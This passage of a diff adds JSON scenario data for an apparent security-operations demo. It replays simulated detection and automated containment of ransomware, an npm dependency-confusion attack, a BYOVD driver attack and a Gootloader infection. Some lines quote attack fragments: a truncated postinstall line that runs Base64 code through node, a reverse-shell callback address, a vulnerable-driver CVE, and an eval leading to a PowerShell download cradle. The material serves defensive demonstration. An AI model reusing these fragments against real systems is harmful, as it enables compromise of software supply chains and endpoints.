+        "text": "[CLAW]   target: crowdstrike_rtr | session: RTR-2026-042",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 qilin.exe (PID 4872) terminated | powershell.exe (PID 3104) terminated",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 4/5: capture_forensic_snapshot",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: crowdstrike_rtr | action: memory_dump + disk_image",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Memory dump: 4.2GB captured | Evidence preserved",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 5/5: create_incident_ticket",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: jira | project: SOC-IR",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 JIRA SOC-IR-2026-042 created | Severity: P1",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE NERVOUS SYSTEM \u2014 Network Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Receiving host containment enforcement...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Enforcing session block...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Action: block_host | Scope: WS-FIN-042 | Duration: indefinite",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 Firewall rule: DENY ALL from 10.1.42.15 \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 DNS sinkhole: qilin C2 domains \u2192 127.0.0.1 \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 SMB lateral movement blocked on subnet 10.1.42.0/24 \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE] Enforcement ID: EDGE-ENF-2026-QILIN-002",
+        "type": "edge"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SCENARIO COMPLETE: Qilin Ransomware Containment        \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Time to Contain: 2.1s | Encrypted Files: 47 | Spread: 0  \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Forensic Evidence: Captured | JIRA Ticket: SOC-IR-2026   \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced. No production systems affected.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Detecting Ransomware...",
+      "body_done": "Qilin Detected",
+      "brain_active": "Analyzing Process Tree...",
+      "brain_done": "Autonomous: APPROVE",
+      "purpose_active": "Isolating Host...",
+      "purpose_done": "5/5 Steps Done",
+      "edge_active": "Blocking Network...",
+      "edge_done": "Host Quarantined"
+    },
+    "success_metrics": "Time to Contain: 2.1s | Files Encrypted: 47 | Lateral Spread: 0 hosts"
+  },
+  "pkg-003": {
+    "id": "pkg-003",
+    "pkg_id": "pkg-003",
+    "title": "Shai-Hulud Supply Chain Attack",
+    "subtitle": "Malicious npm package \u2192 dependency confusion \u2192 reverse shell \u2192 exfiltration",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: SHAI-HULUD SUPPLY CHAIN ATTACK \u2014 pkg-003       \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   Malicious npm \u2192 Dependency Confusion \u2192 Reverse Shell      \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: Shai-Hulud Supply Chain Attack",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor: Shai-Hulud (Supply chain operator)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1195.002, T1059.007, T1027",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: npm audit logs, GitHub Advanced Security, Endpoint EDR",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Package Registry Monitoring \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] GitHub Advanced Security alert: Critical vulnerability",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Package: @internal-corp/auth-utils v2.0.1 (SUSPICIOUS)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Registry: npmjs.com (public) \u2014 name collision with private scope",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Dependency confusion pattern detected:",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Private: @internal-corp/auth-utils v1.8.3 (internal registry)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Public:  @internal-corp/auth-utils v2.0.1 (npmjs \u2014 MALICIOUS)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] postinstall script analysis:",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 node -e \"require('child_process').exec(Buffer.from('...')...\"  (T1059.007)",
+        "type": "error"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Obfuscated payload: Base64 \u2192 eval() \u2192 reverse shell (T1027)",
+        "type": "error"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Callback: 45.33.32.156:4443 (known Shai-Hulud C2)",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Risk Score: CRITICAL | Confidence: 96%",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 Supply Chain Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] CRITICAL supply chain detection received",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Analyzing behavioral intent...",
+        "type": "info"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Package publish timestamp: 2h ago \u2014 too new, no community usage",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Maintainer account: created 24h ago \u2014 throwaway identity",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 postinstall payload: reverse shell \u2192 Shai-Hulud infrastructure",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Dependency confusion: private scope name squatted on public registry",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 CI/CD pipeline at risk: 3 build servers may have pulled this package",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended: quarantine-malicious-package + scan-ci-artifacts",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE | Priority: IMMEDIATE",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 Package Quarantine \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: quarantine-malicious-package v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/4: block_package_registry",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: artifactory | action: BLOCK @internal-corp/auth-utils@2.0.1",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Package blocked in all registries",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/4: scan_ci_artifacts",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: github_api | action: scan last 24h builds",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 1 of 3 build servers compromised \u2014 flagged for isolation",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/4: revoke_ci_tokens",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: github_api | action: revoke PATs for affected service accounts",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 4 tokens revoked | 2 deploy keys rotated",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 4/4: notify_security_team",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 #supply-chain-security alerted with full IOC report",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE NERVOUS SYSTEM \u2014 Build Pipeline Lockdown \u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Receiving pipeline enforcement...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Enforcing session block...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 CI runner build-srv-03: ISOLATED \u2713 \u2014 network quarantined",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 npm registry proxy: ALLOWLIST ONLY mode activated \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 Outbound to 45.33.32.156:4443: BLOCKED \u2713 \u2014 C2 sinkholed",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SCENARIO COMPLETE: Shai-Hulud Supply Chain Attack       \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Time to Quarantine: 1.4s | Compromised Builds: 1/3       \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Tokens Revoked: 4 | C2 Blocked | Pipeline Secured        \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced. No production systems affected.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Scanning Packages...",
+      "body_done": "Malicious npm Found",
+      "brain_active": "Analyzing Supply Chain...",
+      "brain_done": "Decision: QUARANTINE",
+      "purpose_active": "Blocking Registry...",
+      "purpose_done": "Pipeline Secured",
+      "edge_active": "Locking CI/CD...",
+      "edge_done": "Build Quarantined"
+    },
+    "success_metrics": "Time to Quarantine: 1.4s | Compromised Builds: 1/3 | C2: Sinkholed"
+  },
+  "pkg-004": {
+    "id": "pkg-004",
+    "pkg_id": "pkg-004",
+    "title": "Lynx BYOVD Kernel Exploit",
+    "subtitle": "Vulnerable driver load \u2192 kernel exploit \u2192 EDR blind \u2192 privilege escalation",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: LYNX BYOVD KERNEL EXPLOIT \u2014 pkg-004            \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   Vulnerable Driver \u2192 Kernel Exploit \u2192 EDR Bypass           \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: Lynx BYOVD Kernel Exploit",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor: Lynx (Ransomware group using BYOVD)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1068, T1014, T1547.006",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: CrowdStrike Falcon, Windows Event Logs, Sysmon",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Driver Load Monitoring \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] Sysmon EventID 6: Driver loaded",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Driver: C:\\Windows\\Temp\\RTCore64.sys",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Signer: Micro-Star International (MSI) \u2014 VALID but KNOWN VULNERABLE",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] BYOVD database match: CVE-2019-16098 (RTCore64.sys)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Allows arbitrary kernel memory read/write",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Used by: Lynx, BlackByte, AvosLocker, Lazarus",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Load location: \\Windows\\Temp\\ \u2014 non-standard (suspicious)",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Parent process: svchost.exe \u2192 sc.exe create RTCore64 binPath=...",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Post-load: IOCTL calls to patch kernel callback table (T1014)",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Risk Score: CRITICAL | Confidence: 97%",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 BYOVD Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] CRITICAL kernel-level detection received",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Analyzing behavioral intent...",
+        "type": "info"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 RTCore64.sys: known BYOVD weapon (CVE-2019-16098)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Driver loaded from Temp directory: staging technique",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 IOCTL pattern: kernel callback patching \u2192 EDR blinding",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Post-patch: CrowdStrike kernel hooks NULLIFIED",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Threat actor fingerprint: 94% match \u2192 Lynx group",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Urgency: IMMEDIATE \u2014 EDR is being actively disabled",
+        "type": "error"
+      },
+      {
+        "text": "[BRAIN] Recommended: emergency-driver-unload + endpoint-isolation",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE \u2014 autonomous emergency response",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 Driver Removal & Lockdown \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: emergency-byovd-response v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/4: unload_vulnerable_driver",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: crowdstrike_rtr | cmd: sc stop RTCore64 && sc delete RTCore64",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Driver service stopped and removed",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/4: restore_edr_hooks",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: crowdstrike_api | action: force sensor reconnect",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 CrowdStrike kernel callbacks restored | Sensor: ACTIVE",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/4: update_driver_blocklist",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: gpo_api | action: add RTCore64.sys hash to WDAC policy",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Driver hash added to org-wide blocklist",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 4/4: isolate_and_alert",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Host network-isolated | P1 incident created",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE NERVOUS SYSTEM \u2014 Org-Wide Driver Defense \u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Receiving BYOVD enforcement...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Enforcing session block...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 WDAC policy: RTCore64.sys BLOCKED org-wide \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 All endpoints: driver allowlist enforced \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 Kernel integrity monitoring: ELEVATED \u2713",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SCENARIO COMPLETE: Lynx BYOVD Kernel Exploit            \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   EDR Blind Window: 0.9s | Driver: Unloaded + Blocked       \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Org-wide WDAC: Updated | Kernel Hooks: Restored           \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced. No production systems affected.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Monitoring Drivers...",
+      "body_done": "BYOVD Detected",
+      "brain_active": "Analyzing Kernel...",
+      "brain_done": "Emergency: APPROVE",
+      "purpose_active": "Unloading Driver...",
+      "purpose_done": "EDR Restored",
+      "edge_active": "Blocking Drivers...",
+      "edge_done": "WDAC Enforced"
+    },
+    "success_metrics": "EDR Blind Window: 0.9s | Driver: Blocked Org-Wide | Hooks: Restored"
+  },
+  "pkg-005": {
+    "id": "pkg-005",
+    "pkg_id": "pkg-005",
+    "title": "Gootloader SEO Poisoning Campaign",
+    "subtitle": "SEO poisoning \u2192 compromised site \u2192 JavaScript payload \u2192 Gootloader delivery",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: GOOTLOADER SEO POISONING \u2014 pkg-005             \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SEO Poisoning \u2192 Compromised Site \u2192 JS Payload \u2192 Delivery  \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: Gootloader SEO Poisoning Campaign",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat: Gootloader (SEO-based malware delivery)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1189, T1059.007, T1071.001",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: Web proxy logs, DNS logs, Endpoint telemetry",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Web Proxy & DNS Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] Web proxy alert: Suspicious download pattern",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] User: m.torres@corp | Search: 'free employee agreement template'",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Click path:",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Google SERP \u2192 compromised-legal-docs[.]com (SEO rank #3)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Redirect chain: 3 hops \u2192 landing-page-7f3a.netlify.app",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Download: employee_agreement_template.js (NOT .docx)",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] File analysis:",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Filename mismatch: .js extension masquerading as document",
+        "type": "error"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Obfuscation: 147KB of junk code wrapping eval() (T1027)",
+        "type": "error"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Deobfuscated payload: WScript \u2192 PowerShell download cradle",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] DNS correlation: 4 domains resolving to same Gootloader infra",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Risk Score: CRITICAL | Confidence: 93%",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 Gootloader Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving SEO poisoning detection...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Analyzing behavioral intent...",
+        "type": "info"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Search query pattern: legal/business document template",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 SEO keyword stuffing detected on landing page",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 JS payload: Gootloader Stage 1 \u2014 matches known signatures",
+        "type": "brain"
+      },
+      {
